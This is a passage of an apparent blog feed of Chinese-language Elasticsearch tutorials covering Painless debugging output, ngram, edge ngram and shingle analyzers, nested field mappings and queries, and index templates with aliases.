&quot;caused_by&quot;: { &quot;type&quot;: &quot;painless_explain_error&quot;, &quot;reason&quot;: null } }, &quot;status&quot;: 400 } 您可以使用相同的技巧来查看_source是_update API中的LinkedHashMap：1234POST /hockey/_update/1&#123; &quot;script&quot;: &quot;Debug.explain(ctx._source)&quot;&#125;显示的结果是：123456789101112131415161718192021222324252627282930&#123; &quot;error&quot;: &#123; &quot;root_cause&quot;: [ &#123; &quot;type&quot;: &quot;remote_transport_exception&quot;, &quot;reason&quot;: &quot;[localhost][127.0.0.1:9300][indices:data/write/update[s]]&quot; &#125; ], &quot;type&quot;: &quot;illegal_argument_exception&quot;, &quot;reason&quot;: &quot;failed to execute script&quot;, &quot;caused_by&quot;: &#123; &quot;type&quot;: &quot;script_exception&quot;, &quot;reason&quot;: &quot;runtime error&quot;, &quot;painless_class&quot;: &quot;java.util.LinkedHashMap&quot;, &quot;to_string&quot;: &quot;&#123;first=johnny, last=gaudreau, goals=[9, 27, 1], assists=[17, 46, 0], gp=[26, 82, 1], born=1993/08/13, nick=hockey&#125;&quot;, &quot;java_class&quot;: &quot;java.util.LinkedHashMap&quot;, &quot;script_stack&quot;: [ &quot;Debug.explain(ctx._source)&quot;, &quot; ^---- HERE&quot; ], &quot;script&quot;: &quot;Debug.explain(ctx._source)&quot;, &quot;lang&quot;: &quot;painless&quot;, &quot;caused_by&quot;: &#123; &quot;type&quot;: &quot;painless_explain_error&quot;, &quot;reason&quot;: null &#125; &#125; &#125;, &quot;status&quot;: 400&#125;参考：【1】https://www.elastic.co/guide/en/elasticsearch/painless/current/painless-walkthrough.html【2】https://www.elastic.co/guide/en/elasticsearch/painless/current/painless-debugging.html]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20Ngrams%2C%20edge%20ngrams%2C%20and%20shingles%2F</url>
    <content type="text"><![CDATA[Ngrams和edge ngrams是在Elasticsearch中标记文本的两种更独特的方式。 Ngrams是一种将一个标记分成一个单词的每个部分的多个子字符的方法。 ngram和edge ngram过滤器都允许您指定min_gram以及max_gram设置。 这些设置控制单词被分割成的标记的大小。 这可能令人困惑，让我们看一个例子。 假设你想用ngram分析仪分析“spaghetti”这个词，让我们从最简单的情况开始，1-gams（也称为unigrams）。在实际的搜索例子中，比如谷歌搜索：每当我们打入前面的几个字母时，就会出现相应的很多的候选名单。这个就是autocomplete功能。在Elasticsearch中，我们可以通过Edge ngram来实现这个目的。1-grams“spaghetti”的1-grams是s，p，a，g，h，e，t，t，i。 根据ngram的大小将字符串拆分为较小的token。 在这种情况下，每个token都是一个字符，因为我们谈论的是unigrams。Bigrams如果你要将字符串拆分为双字母组（这意味着大小为2），你将获得以下较小的token：sp，pa，ag，gh，he，et，tt，ti。Trigrams再说一次，如果你要使用三个大小，你将得到token为spa，pag，agh，ghe，het，ett，tti。设置min_gram和max_gram使用此分析器时，需要设置两种不同的大小：一种指定要生成的最小ngrams（min_gram设置），另一种指定要生成的最大ngrams。 使用前面的示例，如果您指定min_gram为2且max_gram为3，则您将获得前两个示例中的组合标记：1sp, spa, pa, pag, ag, agh, gh, ghe, he, het, et, ett, tt, tti, ti如果你要将min_gram设置为1并将max_gram设置为3，那么你将得到更多的标记，从s，sp，spa，p，pa，pag，a，….开始。以这种方式分析文本具有一个有趣的优点。 当你查询文本时，你的查询将以相同的方式被分割成文本，所以说你正在寻找拼写错误的单词“spaghety”。搜索这个的一种方法是做一个fuzzy query，它允许你 指定单词的编辑距离以检查匹配。 但是你可以通过使用ngrams来获得类似的行为。 让我们将原始单词（“spaghetti”）生成的bigrams与拼写错误的单词（“spaghety”）进行比较：“spaghetti”的bigrams：sp，pa，ag，gh，he，et，tt，ti“spaghety”的bigrams：sp，pa，ag，gh，he，et，ty您可以看到六个token重叠，因此当查询包含“spaghety”时，其中带有“spaghetti”的单词仍然匹配。请记住，这意味着您可能不打算使用的原始“spaghetti”单词更多的单词 ，所以请务必测试您的查询相关性！ngrams做的另一个有用的事情是允许您在事先不了解语言时或者当您使用与其他欧洲语言不同的方式组合单词的语言时分析文本。 这还有一个优点，即能够使用单个分析器处理多种语言，而不必指定。Edge ngrams常规ngram拆分的变体称为edge ngrams，仅从前沿构建ngram。 在“spaghetti”示例中，如果将min_gram设置为2并将max_gram设置为6，则会获得以下标记：1sp, spa, spag, spagh, spaghe您可以看到每个标记都是从边缘构建的。 这有助于搜索共享相同前缀的单词而无需实际执行前缀查询。 如果你需要从一个单词的后面构建ngrams，你可以使用side属性从后面而不是默认前面获取边缘。Ngram 设置当你不知道语言是什么时，Ngrams是分析文本的好方法，因为它们可以分析单词之间没有空格的语言。 使用min和max grams配置edge ngram analyzer的示例如下所示:1234567891011121314151617181920212223PUT my_index&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;my_analyzer&quot;: &#123; &quot;tokenizer&quot;: &quot;my_tokenizer&quot; &#125; &#125;, &quot;tokenizer&quot;: &#123; &quot;my_tokenizer&quot;: &#123; &quot;type&quot;: &quot;edge_ngram&quot;, &quot;min_gram&quot;: 2, &quot;max_gram&quot;: 10, &quot;token_chars&quot;: [ &quot;letter&quot;, &quot;digit&quot; ] &#125; &#125; &#125; &#125;&#125;我们可以用刚才创建的my_tokenizer来分析我们的字符串：12345POST my_index/_analyze&#123; &quot;analyzer&quot;: &quot;my_analyzer&quot;, &quot;text&quot;: &quot;2 Quick Foxes.&quot;&#125;显示的结果是：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;Qu&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 4, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;Qui&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 5, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;Quic&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 6, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;Quick&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;Fo&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 10, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 4 &#125;, &#123; &quot;token&quot; : &quot;Fox&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 5 &#125;, &#123; &quot;token&quot; : &quot;Foxe&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 12, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 6 &#125;, &#123; &quot;token&quot; : &quot;Foxes&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 13, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 7 &#125; ]&#125;因为我们定义的min_gram是2，所以生成的token的长度是从2开始的。通常我们建议在索引时和搜索时使用相同的分析器。 在edge_ngram tokenizer的情况下，建议是不同的。 仅在索引时使用edge_ngram标记生成器才有意义，以确保部分单词可用于索引中的匹配。 在搜索时，只需搜索用户输入的术语，例如：Quick Fo。下面是如何为搜索类型设置字段的示例：12345678910111213141516171819202122232425262728293031323334353637PUT my_index&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;autocomplete&quot;: &#123; &quot;tokenizer&quot;: &quot;autocomplete&quot;, &quot;filter&quot;: [ &quot;lowercase&quot; ] &#125;, &quot;autocomplete_search&quot;: &#123; &quot;tokenizer&quot;: &quot;lowercase&quot; &#125; &#125;, &quot;tokenizer&quot;: &#123; &quot;autocomplete&quot;: &#123; &quot;type&quot;: &quot;edge_ngram&quot;, &quot;min_gram&quot;: 2, &quot;max_gram&quot;: 10, &quot;token_chars&quot;: [ &quot;letter&quot; ] &#125; &#125; &#125; &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;title&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;autocomplete&quot;, &quot;search_analyzer&quot;: &quot;autocomplete_search&quot; &#125; &#125; &#125;&#125;在我们的例子中，我们索引时和搜索时时用了两个不同的analyzer：autocomplete及autocomplete_search。123456PUT my_index/_doc/1&#123; &quot;title&quot;: &quot;Quick Foxes&quot; &#125; POST my_index/_refresh上面我们加入一个文档。下面我们来进行搜索：1234567891011GET my_index/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;title&quot;: &#123; &quot;query&quot;: &quot;Quick Fo&quot;, &quot;operator&quot;: &quot;and&quot; &#125; &#125; &#125;&#125;显示结果：12345678910111213141516171819202122232425262728&#123; &quot;took&quot; : 3, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.5753642, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.5753642, &quot;_source&quot; : &#123; &quot;title&quot; : &quot;Quick Foxes&quot; &#125; &#125; ] &#125;&#125;在这里autocomplete analyzer可以把字符串“Quick Foxes”分解为[qu, qui, quic, quick, fo, fox, foxe, foxes]。而自autocomplete_search analyzer搜索条目[quick，fo]，两者都出现在索引中。当然我们也可以做如下的搜索：12345678910GET my_index/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;title&quot;: &#123; &quot;query&quot;: &quot;Fo&quot; &#125; &#125; &#125;&#125;显示的和上面一样的结果。Shingles与ngrams和edge ngrams一样，有一个称为shingle的过滤器（不，不是疾病的那个shingle！）。 Shingle token过滤器基本上是token级别的ngrams而不是字符级别。想想我们最喜欢的单词“spaghetti”。使用最小和最大设置为1和3的ngrams，Elasticsearch将生成标记s，sp，spa，p，pa，pag，a，ag等。 一个shingle过滤器在token级别执行此操作，因此如果您有文本“foo bar baz”并再次使用in_shingle_size为2且max_shingle_size为3，则您将生成以下token：1foo, foo bar, foo bar baz, bar, bar baz, baz为什么仍然包含单token输出？ 这是因为默认情况下，shingle过滤器包含原始token，因此原始标记生成令牌foo，bar和baz，然后将其传递给shingle token过滤器，生成标记foo bar，foo bar baz和bar baz。 所有这些token组合在一起形成最终token流。 您可以通过将output_unigrams选项设置为false来禁用此行为，也即不需要最原始的token：foo, bar及baz下一个清单显示了shingle token过滤器的示例; 请注意，min_shingle_size选项必须大于或等于2。123456789101112131415161718192021222324PUT my_index&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;shingle&quot;: &#123; &quot;type&quot;: &quot;custom&quot;, &quot;tokenizer&quot;: &quot;standard&quot;, &quot;filter&quot;: [ &quot;shingle-filter&quot; ] &#125; &#125;, &quot;filter&quot;: &#123; &quot;shingle-filter&quot;: &#123; &quot;type&quot;: &quot;shingle&quot;, &quot;min_shingle_size&quot;: 2, &quot;max_shingle_size&quot;: 3, &quot;output_unigrams&quot;: false &#125; &#125; &#125; &#125;&#125;在这里，我们定义了一个叫做shingle-filter的过滤器。最小的shangle大小是2，最大的shingle大小是3。同时我们设置output_unigrams为false，这样最初的那些token将不被包含在最终的结果之中。下面我们来做一个例子，看看显示的结果：12345GET /my_index/_analyze&#123; &quot;text&quot;: &quot;foo bar baz&quot;, &quot;analyzer&quot;: &quot;shingle&quot;&#125;显示的结果为：1234567891011121314151617181920212223242526&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;foo bar&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;shingle&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;foo bar baz&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;shingle&quot;, &quot;position&quot; : 0, &quot;positionLength&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;bar baz&quot;, &quot;start_offset&quot; : 4, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;shingle&quot;, &quot;position&quot; : 1 &#125; ]&#125;参考：【1】 https://www.elastic.co/guide/en/elasticsearch/reference/7.3/analysis-edgengram-tokenizer.html]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20nested%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[在处理大量数据时，关系数据库存在很多问题。 无论是速度，高效处理，有效并行化，可扩展性还是成本，当数据量开始增长时，关系数据库都会失败。该关系数据库的另一个挑战是必须预先定义关系和模式。Elasticsearch也是一个NoSQL文档数据存储。 但是，尽管是一个NoSQL数据存储，Elasticsearch在一定程度上提供了很多帮助来管理关系数据。 它支持类似SQL的连接，并且在嵌套和相关的数据实体上工作得非常棒。比如，对于一个像下面的blog形式的文档：一个blog可能对应于很多的comments，或者一个员工对应于很多的经验。这种数据就是关系数据。使用Elasticsearch，您可以通过保留轻松地工作与不同实体的关联以及强大的全文搜索和分析。 Elasticsearch通过引入两种类型的文档关系模型使这成为可能：nested 关系: 在这种关系中，这种一对多的关系存在于同一个文档之中parent-child 关系：在这种关系中，它们存在于不同的文档之中。这两种关系在同一个模式下工作，即一对多个的关系。一个root或parent可以有一个及多个子object。如上图所示，在嵌套关系中，有一个根对象，它是我们拥有的主文档，它包含一个称为嵌套文档的子文档数组。 根对象内的文档嵌套级别没有限制。 例如，查看以下JSON以进行多级嵌套：1234567891011121314151617 &#123; &quot;location_id&quot;: &quot;axdbyu&quot;, &quot;location_name&quot;: &quot;gurgaon&quot;, &quot;company&quot;: [ &#123; &quot;name&quot;: &quot;honda&quot;, &quot;modelName&quot;: [ &#123; &quot;name&quot;: &quot;honda cr-v&quot;, &quot;price&quot;: &quot;2 million&quot; &#125; ]&#125;, &#123; &quot;name&quot;: &quot;bmw&quot;, &quot;modelName&quot;: [ &#123; &quot;name&quot;: &quot;BMW 3 Series&quot;, &quot;price&quot;: &quot;2 million&quot;&#125;, &#123; &quot;name&quot;: &quot;BMW 1 Series&quot;, &quot;price&quot;: &quot;3 million&quot; &#125; ] &#125; ]&#125;下面，我们来做一个例子来展示一下为什么nested对象可以解决我们的问题。Object数据类型我们首先创建一个叫做developer的index，并输入如下的两个数据：12345678910111213141516171819202122232425POST developer/_doc/101&#123; &quot;name&quot;: &quot;zhang san&quot;, &quot;skills&quot;: [ &#123; &quot;language&quot;: &quot;ruby&quot;, &quot;level&quot;: &quot;expert&quot; &#125;, &#123; &quot;language&quot;: &quot;javascript&quot;, &quot;level&quot;: &quot;beginner&quot; &#125; ]&#125; POST developer/_doc/102&#123; &quot;name&quot;: &quot;li si&quot;, &quot;skills&quot;: [ &#123; &quot;language&quot;: &quot;ruby&quot;, &quot;level&quot;: &quot;beginner&quot; &#125; ]&#125;上面显示是一对多的一个index。Object Query这个时候我们想搜一个skills: language是ruby，并且level是biginner的文档。我们可能想到的方法是：12345678910111213141516171819GET developer/_search&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;filter&quot;: [ &#123; &quot;match&quot;: &#123; &quot;skills.language&quot;: &quot;ruby&quot; &#125; &#125;, &#123; &quot;match&quot;: &#123; &quot;skills.level&quot;: &quot;beginner&quot; &#125; &#125; ] &#125; &#125;&#125;通过上面的搜寻，我们得到的结果是：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;developer&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;101&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;name&quot; : &quot;zhang san&quot;, &quot;skills&quot; : [ &#123; &quot;language&quot; : &quot;ruby&quot;, &quot;level&quot; : &quot;expert&quot; &#125;, &#123; &quot;language&quot; : &quot;javascript&quot;, &quot;level&quot; : &quot;beginner&quot; &#125; ] &#125; &#125;, &#123; &quot;_index&quot; : &quot;developer&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;102&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;name&quot; : &quot;li si&quot;, &quot;skills&quot; : [ &#123; &quot;language&quot; : &quot;ruby&quot;, &quot;level&quot; : &quot;beginner&quot; &#125; ] &#125; &#125; ] &#125;&#125;我们可以看到，我们得到两个结果。但是我们仔细查看一下发现得到的结果并不是我们想得到的。从我们的原意来说，我们想得到的是li si，因为只有li si这个人的language是ruby，并且他的level是biginner。zhang san这个文档，应该不在搜寻之列。这是为什么呢？原来，langauge及level是skills的JSON内部数组项。当JSON对象被Lucene扁平化后，我们失去了language和level之间的对应关系。取而代之的是如下的这种关系：12345&#123; &quot;name&quot;: &quot;zhang san&quot;, &quot;skills.language&quot; :[&quot;ruby&quot;, &quot;javascript&quot;], &quot;skills.level&quot;: [&quot;expert&quot;, &quot;beginner&quot;]&#125;如上所示，我们看到的是一个扁平化的数组。之前的那种language和level之间的那种对应关系已经不存在了。Object aggregation同样的问题也存在于aggregation中，比如我们想做一下的aggregation:12345678910111213141516GET developer/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;languages&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;skills.language.keyword&quot; &#125;, &quot;aggs&quot;: &#123; &quot;level&quot;: &#123; &quot;terms&quot;: &#123;&quot;field&quot;: &quot;skills.level.keyword&quot;&#125; &#125; &#125; &#125; &#125;&#125;显示的结果是：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&#123; &quot;took&quot; : 2, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;languages&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;ruby&quot;, &quot;doc_count&quot; : 2, &quot;level&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;beginner&quot;, &quot;doc_count&quot; : 2 &#125;, &#123; &quot;key&quot; : &quot;expert&quot;, &quot;doc_count&quot; : 1 &#125; ] &#125; &#125;, &#123; &quot;key&quot; : &quot;javascript&quot;, &quot;doc_count&quot; : 1, &quot;level&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;beginner&quot;, &quot;doc_count&quot; : 1 &#125;, &#123; &quot;key&quot; : &quot;expert&quot;, &quot;doc_count&quot; : 1 &#125; ] &#125; &#125; ] &#125; &#125;&#125;显然，对于key javascript来说，它并没有expert对应的level，但是在我们的aggregation里显示出来了。这个结果显然是错误的。nested 数据类型nested数据类型能够让我们对object数组建立索引，并且分别进行查询。如果需要维护数组中每个对象的关系，请使用nested数据类型为了能够把我们的数据定义为nested，我们必须修改之前的索引mapping为：1234567891011121314151617181920212223DELETE developer PUT developer&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;name&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;, &quot;skills&quot;: &#123; &quot;type&quot;: &quot;nested&quot;, &quot;properties&quot;: &#123; &quot;language&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;level&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125; &#125; &#125; &#125; &#125;&#125;经过这样的改造之后，重新把我们之前的数据输入到index里：12345678910111213141516171819202122232425POST developer/_doc/101&#123; &quot;name&quot;: &quot;zhang san&quot;, &quot;skills&quot;: [ &#123; &quot;language&quot;: &quot;ruby&quot;, &quot;level&quot;: &quot;expert&quot; &#125;, &#123; &quot;language&quot;: &quot;javascript&quot;, &quot;level&quot;: &quot;beginner&quot; &#125; ]&#125; POST developer/_doc/102&#123; &quot;name&quot;: &quot;li si&quot;, &quot;skills&quot;: [ &#123; &quot;language&quot;: &quot;ruby&quot;, &quot;level&quot;: &quot;beginner&quot; &#125; ]&#125;针对101，在Lucence中的数据结构变为：1234567891011&#123; &quot;name&quot;: &quot;zhang san&quot;, &#123; &quot;skills.language&quot;: &quot;ruby&quot;, &quot;skills.level&quot;: &quot;expert&quot; &#125;, &#123; &quot;skills.language&quot;: &quot;javascript&quot;, &quot;skills.level&quot;, &quot;beginner&quot; &#125;&#125;nested query我们来重新做我们之前的搜索：123456789101112131415161718192021222324GET developer/_search&#123; &quot;query&quot;: &#123; &quot;nested&quot;: &#123; &quot;path&quot;: &quot;skills&quot;, &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;filter&quot;: [ &#123; &quot;match&quot;: &#123; &quot;skills.language&quot;: &quot;ruby&quot; &#125; &#125;, &#123; &quot;match&quot;: &#123; &quot;skills.level&quot;: &quot;beginner&quot; &#125; &#125; ] &#125; &#125; &#125; &#125;&#125;注意上面的“nested”字段。显示的结果是：12345678910111213141516171819202122232425262728293031323334&#123; &quot;took&quot; : 5, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;developer&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;102&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;name&quot; : &quot;li si&quot;, &quot;skills&quot; : [ &#123; &quot;language&quot; : &quot;ruby&quot;, &quot;level&quot; : &quot;beginner&quot; &#125; ] &#125; &#125; ] &#125;&#125;显然，我们只得到了一个我们想要的结果。nested aggregation同样，我们可以对我们的index来做一个aggregation:12345678910111213141516171819202122232425GET developer/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;nested_skills&quot;: &#123; &quot;nested&quot;: &#123; &quot;path&quot;: &quot;skills&quot; &#125;, &quot;aggs&quot;: &#123; &quot;languages&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;skills.language&quot; &#125;, &quot;aggs&quot;: &#123; &quot;levels&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;skills.level&quot; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;显示的结果是：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;nested_skills&quot; : &#123; &quot;doc_count&quot; : 3, &quot;languages&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;ruby&quot;, &quot;doc_count&quot; : 2, &quot;levels&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;beginner&quot;, &quot;doc_count&quot; : 1 &#125;, &#123; &quot;key&quot; : &quot;expert&quot;, &quot;doc_count&quot; : 1 &#125; ] &#125; &#125;, &#123; &quot;key&quot; : &quot;javascript&quot;, &quot;doc_count&quot; : 1, &quot;levels&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;beginner&quot;, &quot;doc_count&quot; : 1 &#125; ] &#125; &#125; ] &#125; &#125; &#125;&#125;从上面显示的结果，可以看出来对于ruby来说，它分别对应于一个bigginer及一个expert。这个和我们之前的数据是一样的。对于javascript来说，它只有一个beginner的level。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20Index%20template%2F</url>
    <content type="text"><![CDATA[Index template定义在创建新index时可以自动应用的settings和mappings。 Elasticsearch根据与index名称匹配的index模式将模板应用于新索引。这个对于我们想创建的一系列的Index具有同样的settings及mappings。比如我们希望每一天/月的日志的index都具有同样的设置。Index template仅在index创建期间应用。 对index template的更改不会影响现有索引。 create index API请求中指定的设置和映射会覆盖索引模板中指定的任何设置或映射。你可以在代码中加入像C语言那样的block注释。你可以把这个注释放在出来开头 “{”和结尾的“}”之间的任何地方。定义一个Index template我们可以使用如下的接口来定义一个index template：1PUT /_template/&lt;index-template&gt;我们可以使用_template这个终点来创建，删除，查看一个index template。下面，我们来举一个例子：12345678910111213141516PUT _template/logs_template&#123; &quot;index_patterns&quot;: &quot;logs-*&quot;, &quot;order&quot;: 1, &quot;settings&quot;: &#123; &quot;number_of_shards&quot;: 4, &quot;number_of_replicas&quot;: 1 &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;@timestamp&quot;: &#123; &quot;type&quot;: &quot;date&quot; &#125; &#125; &#125;&#125;在上面，我们可以看到，我们定义了一个叫做logs_template的index template。它的index_patterns定义为“logs-*”，说明，任何以“logs-”为开头的任何一个index将具有在该template里具有的settings及mappings属性。这里的“order”的意思是：如果索引与多个模板匹配，则Elasticsearch应用此模板的顺序。该值为1，表明有最先合并，如果有更高order的template，这个settings或mappings有可能被其它的template所覆盖。下面，我们来测试一下我们刚定义的index template：1PUT logs-2019-03-01在这里，我们创建了一个叫做logs-2019-03-01的index。我们使用如下的命令来检查被创建的情况：1GET logs-2019-03-01显示的结果为：123456789101112131415161718192021222324&#123; &quot;logs-2019-03-01&quot; : &#123; &quot;aliases&quot; : &#123; &#125;, &quot;mappings&quot; : &#123; &quot;properties&quot; : &#123; &quot;@timestamp&quot; : &#123; &quot;type&quot; : &quot;date&quot; &#125; &#125; &#125;, &quot;settings&quot; : &#123; &quot;index&quot; : &#123; &quot;creation_date&quot; : &quot;1567652671032&quot;, &quot;number_of_shards&quot; : &quot;4&quot;, &quot;number_of_replicas&quot; : &quot;1&quot;, &quot;uuid&quot; : &quot;Dz5rqRS4SEyLM_gf5eEolQ&quot;, &quot;version&quot; : &#123; &quot;created&quot; : &quot;7030099&quot; &#125;, &quot;provided_name&quot; : &quot;logs-2019-03-01&quot; &#125; &#125; &#125;&#125;证如上所示，我们已经成功创建了一个我们想要的index，并且它具有我们之前定义的settings及mappings。Index template和alias我们甚至可以为我们的index template添加index alias：12345678910111213141516171819PUT _template/logs_template&#123; &quot;index_patterns&quot;: &quot;logs-*&quot;, &quot;order&quot;: 1, &quot;settings&quot;: &#123; &quot;number_of_shards&quot;: 4, &quot;number_of_replicas&quot;: 1 &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;@timestamp&quot;: &#123; &quot;type&quot;: &quot;date&quot; &#125; &#125; &#125;, &quot;aliases&quot;: &#123; &quot;&#123;index&#125;-alias&quot; : &#123;&#125; &#125;&#125;在上面，我们已经创立了一个叫做{index}-alias的别名。这里的{index}就是实际生成index的文件名来代替。我们下面用一个例子来说明：1PUT logs-2019-04-01我们创建一个叫做logs-2019-04-01的index, 那么它同时生成了一个叫做logs-2019-04-01-alias的别名。我们可以通过如下的命令来检查：1GET logs-2019-04-01-alias显示的结果是：1234567891011121314151617181920212223242526&#123; &quot;logs-2019-04-01&quot; : &#123; &quot;aliases&quot; : &#123; &quot;logs-2019-04-01-alias&quot; : &#123; &#125; &#125;, &quot;mappings&quot; : &#123; &quot;properties&quot; : &#123; &quot;@timestamp&quot; : &#123; &quot;type&quot; : &quot;date&quot; &#125; &#125; &#125;, &quot;settings&quot; : &#123; &quot;index&quot; : &#123; &quot;creation_date&quot; : &quot;1567653644605&quot;, &quot;number_of_shards&quot; : &quot;4&quot;, &quot;number_of_replicas&quot; : &quot;1&quot;, &quot;uuid&quot; : &quot;iLf-j_G2T4CYcHCqwz32Ng&quot;, &quot;version&quot; : &#123; &quot;created&quot; : &quot;7030099&quot; &#125;, &quot;provided_name&quot; : &quot;logs-2019-04-01&quot; &#125; &#125; 